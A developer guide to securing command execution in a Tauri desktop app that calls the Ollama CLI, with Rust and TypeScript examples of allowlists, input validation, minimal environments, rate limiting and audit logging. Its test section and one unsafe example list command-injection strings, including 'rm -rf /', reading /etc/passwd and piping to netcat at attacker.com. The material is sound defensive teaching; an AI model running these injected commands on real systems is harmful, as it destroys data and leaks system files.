# Security and Permissions for Command Execution

## Overview

Executing system commands from a desktop application requires careful security considerations. This document covers Tauri permissions, Node.js security practices, and best practices for safely executing Ollama commands.

## Document Navigation

**Related Documents:**
- **[Tauri Command Execution Fundamentals](./01-tauri-command-execution-fundamentals.md)** - Basic Tauri command patterns and permissions
- **[Rust Process Execution Security](./02-rust-process-execution-patterns.md)** - Security patterns for Rust command execution
- **[GraphQL-Tauri Integration](./03-graphql-tauri-integration.md)** - Security considerations for Node.js command execution
- **[Ollama CLI Command Reference](./04-ollama-cli-command-reference.md)** - Command validation and input sanitization examples
- **[Error Handling and Debugging](./06-error-handling-debugging.md)** - Security event logging and error handling
- **[Practical Implementation Guide](./07-practical-implementation-guide.md)** - Secure implementation practices

## Tauri Permissions System

### Understanding Tauri Capabilities

Tauri uses a capabilities-based permission system. Permissions are defined in JSON files under `src-tauri/capabilities/`.

**Current Default Capabilities** (`src-tauri/capabilities/default.json`):
```json
{
  "$schema": "../gen/schemas/desktop-schema.json",
  "identifier": "default",
  "description": "enables the default permissions for LLM UI desktop app",
  "windows": ["main"],
  "permissions": [
    "core:default",
    "core:window:allow-close",
    "core:window:allow-hide",
    "core:window:allow-show",
    "core:window:allow-set-focus",
    "core:window:allow-set-always-on-top",
    "core:window:allow-unmaximize",
    "core:window:allow-minimize",
    "core:window:allow-maximize",
    "core:window:allow-start-dragging",
    "log:default"
  ]
}
```

### Required Permissions for Command Execution

To execute system commands from Tauri, you need to add shell permissions:

**Updated `default.json`**:
```json
{
  "$schema": "../gen/schemas/desktop-schema.json",
  "identifier": "default",
  "description": "enables the default permissions for LLM UI desktop app",
  "windows": ["main"],
  "permissions": [
    "core:default",
    "core:window:allow-close",
    "core:window:allow-hide",
    "core:window:allow-show",
    "core:window:allow-set-focus",
    "core:window:allow-set-always-on-top",
    "core:window:allow-unmaximize",
    "core:window:allow-minimize",
    "core:window:allow-maximize",
    "core:window:allow-start-dragging",
    "log:default",
    "shell:allow-execute",
    "shell:allow-open"
  ]
}
```

### Permission Granularity

For enhanced security, you can use more granular permissions:

**Option 1: Allowlist Specific Commands**:
```json
{
  "permissions": [
    "shell:allow-execute",
    {
      "identifier": "shell:allow-execute",
      "allow": [
        {
          "name": "ollama",
          "cmd": "ollama",
          "args": ["list", "show", "generate", "pull", "ps", "stop", "rm"]
        }
      ]
    }
  ]
}
```

**Option 2: Create Separate Capability File**:
```json
// src-tauri/capabilities/ollama-commands.json
{
  "$schema": "../gen/schemas/desktop-schema.json",
  "identifier": "ollama-commands",
  "description": "Permissions for executing Ollama CLI commands",
  "windows": ["main"],
  "permissions": [
    {
      "identifier": "shell:allow-execute",
      "allow": [
        {
          "name": "ollama",
          "cmd": "ollama",
          "args": ["list", "show", "generate", "pull", "ps", "stop", "rm"]
        }
      ]
    }
  ]
}
```

Then reference it in `tauri.conf.json`:
```json
{
  "app": {
    "security": {
      "capabilities": ["default", "ollama-commands"]
    }
  }
}
```

## Rust Command Execution Security

### Safe Command Construction

**❌ UNSAFE: String Concatenation**:
```rust
// DON'T DO THIS - vulnerable to command injection
let command = format!("ollama {}", user_input);
std::process::Command::new("sh")
    .arg("-c")
    .arg(&command)
    .output();
```

**✅ SAFE: Structured Arguments**:
```rust
use std::process::Command;

// DO THIS - arguments are properly escaped
let mut cmd = Command::new("ollama");
cmd.arg("list"); // Safe, hardcoded command

// For user input, validate first
fn execute_ollama_command(command: &str, args: Vec<String>) -> Result<String, String> {
    // Whitelist allowed commands
    let allowed_commands = ["list", "show", "generate", "pull", "ps", "stop", "rm"];

    if !allowed_commands.contains(&command) {
        return Err(format!("Command '{}' is not allowed", command));
    }

    // Validate model names (if applicable)
    for arg in &args {
        if !is_valid_model_name(arg) {
            return Err(format!("Invalid model name: {}", arg));
        }
    }

    let output = Command::new("ollama")
        .arg(command)
        .args(&args)
        .output()
        .map_err(|e| format!("Failed to execute: {}", e))?;

    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

fn is_valid_model_name(name: &str) -> bool {
    // Only allow alphanumeric, colons, hyphens, underscores
    name.chars().all(|c| c.is_alphanumeric() || c == ':' || c == '-' || c == '_')
}
```

### Environment Variable Security

**❌ UNSAFE: Inheriting All Environment Variables**:
```rust
// DON'T DO THIS - may expose sensitive environment variables
let output = Command::new("ollama")
    .arg("list")
    .output();
```

**✅ SAFE: Minimal Environment**:
```rust
use std::env;

fn execute_with_minimal_env() -> Result<String, String> {
    let mut cmd = Command::new("ollama");
    cmd.arg("list");

    // Only inherit PATH and HOME (if needed)
    cmd.env_clear();
    if let Ok(path) = env::var("PATH") {
        cmd.env("PATH", path);
    }
    if let Ok(home) = env::var("HOME") {
        cmd.env("HOME", home);
    }

    let output = cmd.output()
        .map_err(|e| format!("Failed to execute: {}", e))?;

    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}
```

### Working Directory Security

**✅ SAFE: Explicit Working Directory**:
```rust
use std::path::Path;

fn execute_in_safe_directory() -> Result<String, String> {
    // Use a known safe directory (e.g., user's home or temp)
    let safe_dir = env::var("HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("/tmp"));

    let output = Command::new("ollama")
        .arg("list")
        .current_dir(&safe_dir)
        .output()
        .map_err(|e| format!("Failed to execute: {}", e))?;

    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}
```

## Node.js Command Execution Security

### Using `child_process.exec` Safely

**❌ UNSAFE: Template Literals with User Input**:
```typescript
// DON'T DO THIS - vulnerable to command injection
const userModel = req.body.model; // Could be "llama2:7b; rm -rf /"
exec(`ollama show ${userModel}`, (error, stdout, stderr) => {
  // ...
});
```

**✅ SAFE: Structured Arguments**:
```typescript
import { execFile } from 'child_process';
import { promisify } from 'util';

const execFileAsync = promisify(execFile);

// Whitelist of allowed commands
const ALLOWED_COMMANDS = ['list', 'show', 'generate', 'pull', 'ps', 'stop', 'rm'];

async function executeOllamaCommand(
  command: string,
  args: string[] = []
): Promise<{ stdout: string; stderr: string }> {
  // Validate command
  if (!ALLOWED_COMMANDS.includes(command)) {
    throw new Error(`Command '${command}' is not allowed`);
  }

  // Validate arguments (especially model names)
  for (const arg of args) {
    if (!/^[a-zA-Z0-9:_-]+$/.test(arg)) {
      throw new Error(`Invalid argument: ${arg}`);
    }
  }

  // Use execFile instead of exec - prevents shell injection
  const { stdout, stderr } = await execFileAsync('ollama', [command, ...args], {
    timeout: 30000, // 30 second timeout
    maxBuffer: 1024 * 1024, // 1MB max output
    env: {
      // Only pass necessary environment variables
      PATH: process.env.PATH || '',
      HOME: process.env.HOME || '',
    }
  });

  return { stdout, stderr };
}
```

### Using `child_process.spawn` Safely

**✅ SAFE: Spawn with Validation**:
```typescript
import { spawn } from 'child_process';

function spawnOllamaCommand(
  command: string,
  args: string[] = []
): Promise<string> {
  return new Promise((resolve, reject) => {
    // Validate command and arguments
    if (!ALLOWED_COMMANDS.includes(command)) {
      reject(new Error(`Command '${command}' is not allowed`));
      return;
    }

    for (const arg of args) {
      if (!/^[a-zA-Z0-9:_-]+$/.test(arg)) {
        reject(new Error(`Invalid argument: ${arg}`));
        return;
      }
    }

    const process = spawn('ollama', [command, ...args], {
      env: {
        PATH: process.env.PATH || '',
        HOME: process.env.HOME || '',
      },
      stdio: ['ignore', 'pipe', 'pipe'] // Don't inherit stdin
    });

    let stdout = '';
    let stderr = '';

    process.stdout.on('data', (chunk) => {
      stdout += chunk.toString();
    });

    process.stderr.on('data', (chunk) => {
      stderr += chunk.toString();
    });

    process.on('close', (code) => {
      if (code === 0) {
        resolve(stdout);
      } else {
        reject(new Error(`Command failed: ${stderr || 'Unknown error'}`));
      }
    });

    process.on('error', (error) => {
      reject(new Error(`Failed to spawn process: ${error.message}`));
    });
  });
}
```

## Input Validation

### Model Name Validation

```typescript
function validateModelName(modelName: string): boolean {
  // Model names should:
  // - Be non-empty
  // - Contain only alphanumeric, colons, hyphens, underscores
  // - Not start or end with special characters
  // - Have reasonable length (e.g., max 100 chars)

  if (!modelName || modelName.length === 0 || modelName.length > 100) {
    return false;
  }

  // Pattern: alphanumeric, colon, hyphen, underscore only
  const validPattern = /^[a-zA-Z0-9][a-zA-Z0-9:_-]*[a-zA-Z0-9]$/;

  if (!validPattern.test(modelName)) {
    return false;
  }

  // Additional checks
  // - No consecutive special characters
  if (/[:_-]{2,}/.test(modelName)) {
    return false;
  }

  // - No leading/trailing special characters (already covered by pattern)

  return true;
}
```

### Command Argument Validation

```typescript
interface CommandValidation {
  valid: boolean;
  error?: string;
}

function validateOllamaCommand(
  command: string,
  args: string[]
): CommandValidation {
  // Check command is allowed
  if (!ALLOWED_COMMANDS.includes(command)) {
    return {
      valid: false,
      error: `Command '${command}' is not in the allowed list`
    };
  }

  // Command-specific validation
  switch (command) {
    case 'show':
    case 'generate':
    case 'pull':
    case 'stop':
    case 'rm':
      if (args.length === 0) {
        return {
          valid: false,
          error: `Command '${command}' requires a model name`
        };
      }
      if (!validateModelName(args[0])) {
        return {
          valid: false,
          error: `Invalid model name: ${args[0]}`
        };
      }
      break;

    case 'list':
    case 'ps':
      // These commands don't require arguments
      if (args.length > 0) {
        return {
          valid: false,
          error: `Command '${command}' does not accept arguments`
        };
      }
      break;

    default:
      // For other commands, validate all args as potential model names
      for (const arg of args) {
        if (!validateModelName(arg)) {
          return {
            valid: false,
            error: `Invalid argument: ${arg}`
          };
        }
      }
  }

  return { valid: true };
}
```

## Rate Limiting and Resource Controls

### Command Execution Limits

```typescript
class CommandExecutionLimiter {
  private executions: Map<string, number[]> = new Map();
  private readonly maxExecutionsPerMinute = 10;
  private readonly maxExecutionsPerHour = 100;

  canExecute(command: string): boolean {
    const now = Date.now();
    const commandExecutions = this.executions.get(command) || [];

    // Remove executions older than 1 hour
    const recentExecutions = commandExecutions.filter(
      time => now - time < 3600000 // 1 hour
    );

    // Check hourly limit
    if (recentExecutions.length >= this.maxExecutionsPerHour) {
      return false;
    }

    // Check per-minute limit
    const lastMinute = recentExecutions.filter(
      time => now - time < 60000 // 1 minute
    );

    if (lastMinute.length >= this.maxExecutionsPerMinute) {
      return false;
    }

    // Update executions list
    recentExecutions.push(now);
    this.executions.set(command, recentExecutions);

    return true;
  }

  reset() {
    this.executions.clear();
  }
}
```

### Timeout Implementation

```typescript
async function executeWithTimeout(
  command: string,
  args: string[],
  timeoutMs: number = 30000
): Promise<string> {
  return Promise.race([
    executeOllamaCommand(command, args),
    new Promise<string>((_, reject) => {
      setTimeout(() => {
        reject(new Error(`Command timeout after ${timeoutMs}ms`));
      }, timeoutMs);
    })
  ]);
}
```

## Logging and Audit Trail

### Security Event Logging

```typescript
interface SecurityEvent {
  timestamp: string;
  eventType: 'command_executed' | 'command_blocked' | 'validation_failed';
  command: string;
  args: string[];
  userId?: string;
  ipAddress?: string;
  success: boolean;
  error?: string;
}

class SecurityLogger {
  logEvent(event: SecurityEvent) {
    // Log to file, database, or security monitoring system
    console.log('[SECURITY]', JSON.stringify(event));

    // For production, use proper logging library
    // logger.info('Security event', event);
  }

  logCommandExecution(
    command: string,
    args: string[],
    success: boolean,
    error?: string
  ) {
    this.logEvent({
      timestamp: new Date().toISOString(),
      eventType: success ? 'command_executed' : 'command_blocked',
      command,
      args,
      success,
      error
    });
  }
}
```

## Best Practices Summary

1. **Always validate input** before executing commands
2. **Use whitelists** for allowed commands and arguments
3. **Prefer `execFile`/`spawn` over `exec`** to avoid shell injection
4. **Set explicit timeouts** for all command executions
5. **Limit environment variables** to only what's necessary
6. **Use structured arguments** instead of string concatenation
7. **Implement rate limiting** to prevent abuse
8. **Log all command executions** for audit purposes
9. **Use Tauri capabilities** to restrict permissions at the framework level
10. **Test security measures** with malicious input examples

## Testing Security Measures

### Security Test Cases

```typescript
describe('Ollama Command Security', () => {
  it('should reject command injection attempts', async () => {
    const maliciousInputs = [
      'llama2:7b; rm -rf /',
      'llama2:7b && cat /etc/passwd',
      'llama2:7b | nc attacker.com 1234',
      '$(whoami)',
      '`id`',
    ];

    for (const input of maliciousInputs) {
      await expect(
        executeOllamaCommand('show', [input])
      ).rejects.toThrow();
    }
  });

  it('should reject invalid commands', async () => {
    await expect(
      executeOllamaCommand('rm -rf /', [])
    ).rejects.toThrow('not allowed');
  });

  it('should enforce rate limits', async () => {
    const limiter = new CommandExecutionLimiter();

    // Execute max allowed commands
    for (let i = 0; i < 10; i++) {
      expect(limiter.canExecute('list')).toBe(true);
    }

    // Next one should be blocked
    expect(limiter.canExecute('list')).toBe(false);
  });
});
```

## References

**External Resources:**
- [Tauri Security Documentation](https://tauri.app/v1/guides/security/)
- [Tauri Capabilities System](https://tauri.app/v2/guides/security/capabilities/)
- [Node.js Child Process Security](https://nodejs.org/api/child_process.html#child_process_security_concerns)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

**Related Documents:**
- **[Tauri Command Execution Fundamentals](./01-tauri-command-execution-fundamentals.md)** - Basic Tauri permissions and command structure
- **[Rust Process Execution Patterns](./02-rust-process-execution-patterns.md)** - Secure Rust command execution patterns
- **[GraphQL-Tauri Integration](./03-graphql-tauri-integration.md)** - Security practices for Node.js command execution
- **[Ollama CLI Command Reference](./04-ollama-cli-command-reference.md)** - Command validation examples
- **[Error Handling and Debugging](./06-error-handling-debugging.md)** - Security event logging and error handling
- **[Practical Implementation Guide](./07-practical-implementation-guide.md)** - Secure implementation workflow
